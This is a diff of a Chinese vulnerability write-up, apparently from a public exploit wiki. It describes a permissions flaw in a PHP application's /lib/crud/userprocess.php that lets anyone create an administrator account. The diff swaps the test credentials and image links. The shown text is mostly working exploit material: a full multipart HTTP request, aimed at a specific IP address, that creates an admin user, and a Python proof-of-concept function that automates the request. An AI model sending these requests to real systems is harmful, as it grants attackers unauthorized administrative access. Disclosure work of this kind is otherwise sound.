@@ -272,7 +272,7 @@ $process = new Process;
 
 出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户
 
-发送如下请求包创建管理员用户 pqtest，密码为 PQtest@123
+发送如下请求包创建管理员用户 testtest，密码为 testtest@123
 
 ```
 POST /lib/crud/userprocess.php HTTP/1.1
@@ -285,25 +285,25 @@ Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc
 Upgrade-Insecure-Requests: 1
 Referer: http://194.149.41.11/useradmin.php
 Origin: http://194.149.41.11/
-Cookie: PHPSESSID=pq
+Cookie: PHPSESSID=test
 Content-Length: 697
 
 --b1467349fcce4aa0ae8d44439f4e06bc
 Content-Disposition: form-data; name="username"
 
-pqtest
+testtest
 --b1467349fcce4aa0ae8d44439f4e06bc
 Content-Disposition: form-data; name="password"
 
-PQtest@123
+testtest@123
 --b1467349fcce4aa0ae8d44439f4e06bc
 Content-Disposition: form-data; name="passconf"
 
-PQtest@123
+testtest@123
 --b1467349fcce4aa0ae8d44439f4e06bc
 Content-Disposition: form-data; name="email"
 
-PQtest@test.com
+testtest@test.com
 --b1467349fcce4aa0ae8d44439f4e06bc
 Content-Disposition: form-data; name="ulevelid"
 
@@ -319,11 +319,11 @@ Content-Disposition: form-data; name="editid"
 --b1467349fcce4aa0ae8d44439f4e06bc--
 ```
 
-![](image/rc-2.png)
+![](http://wikioss.peiqi.tech/vuln/rc-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
-成功创建用户 pqtest，以管理员身份登录后台
+成功创建用户 testtest，以管理员身份登录后台
 
-![](image/rc-3.png)
+![](http://wikioss.peiqi.tech/vuln/rc-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 
 
@@ -361,10 +361,10 @@ def POC_1(target_url):
     origin = target_url
     multipart_data = MultipartEncoder(
         fields={
-            'username': 'pqtest{}'.format(ran_number),
-            'password': 'PQtest@{}'.format(ran_number),
-            'passconf': 'PQtest@{}'.format(ran_number),
-            'email': 'PQtest{}@test.com'.format(ran_number),
+            'username': 'testtest{}'.format(ran_number),
+            'password': 'testtest@{}'.format(ran_number),
+            'passconf': 'testtest@{}'.format(ran_number),
+            'email': 'testtest{}@test.com'.format(ran_number),
             'ulevelid': '9',
             'add': 'add',
             'editid': ''
@@ -372,13 +372,13 @@ def POC_1(target_url):
     )
     headers = {'Content-Type': multipart_data.content_type, "Upgrade-Insecure-Requests": "1", "Referer": referer,
                "Origin": origin}
-    cookies = {'PHPSESSID': 'pqtest{}'.format(ran_number)}
+    cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)}
     print("\033[36m[o] 正在创建账户..... \033[0m".format(ran_number, ran_number))
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
         if "error" not in response.text:
-            print("\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \033[0m".format(ran_number, ran_number))
+            print("\033[36m[o] 成功创建账户 testtest{}/testtest@{} \033[0m".format(ran_number, ran_number))
         else:
             print("\033[31m[x] 创建失败:{} \033[0m")
     except Exception as e:
@@ -393,4 +393,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/rc-4.png)
+![](http://wikioss.peiqi.tech/vuln/rc-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
